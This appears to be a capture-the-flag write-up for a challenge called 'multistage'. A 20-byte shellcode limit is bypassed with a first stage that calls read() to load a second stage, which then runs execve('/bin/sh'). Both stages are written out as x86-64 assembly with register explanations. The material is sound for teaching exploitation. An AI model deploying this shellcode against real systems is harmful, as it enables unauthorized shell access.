# multistage

This challenge reads shellcode from stdin and executes it. The problem is that it reads just 20 (0x14) bytes that are not enough to write a shellcode that spawns a shell.

The idea is to write a first stage that reads the second stage from stdin.

## First Stage

```c
mov rsi, rax
xor rax, rax
mov rdi, rax
mov rdx, 0x1000
syscall
; 2 * 0x90
```

- RSI: set to the address of the second stage
- RAX: set to 0 (SYS_read)
- RDI: set to 0 (stdin)
- RDX: set to 0x1000 (4096 bytes), the number of bytes to read (basically a random large enough number)

## Second Stage

```c
; 20*0x90 to align with the RIP
mov rdi, rsi
add rdi, 0x2a
mov rax, 0x3b
xor rsi, rsi
xor rdx, rdx
syscall
.string "/bin/sh"
```

- RDI: set to the address of the string "/bin/sh" (RSI + 0x2a)
- RAX: set to 0x3b (SYS_execve)
- RSI: set to 0 (NULL)
- RDX: set to 0 (NULL)

Why 0x2a? Because the first stage is 20 bytes long and the second one is 22 bytes long. So the total is 42 = 0x2a.

The complete exploit is in [script.py](script.py).
